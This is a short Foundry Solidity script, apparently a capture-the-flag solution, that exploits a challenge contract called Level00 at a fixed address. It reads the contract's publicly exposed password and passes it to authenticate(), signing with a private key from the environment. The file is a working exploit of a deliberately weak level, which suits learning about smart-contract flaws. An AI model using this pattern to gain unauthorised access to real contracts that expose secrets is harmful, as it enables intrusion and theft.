// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level00.sol";

contract AttackerScript is Script {
    Level00 level00 = Level00(0xcA795B3961748aef7e2EFC4C997813839797D77D);

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      level00.authenticate(level00.password());
      vm.stopBroadcast();
    }
}
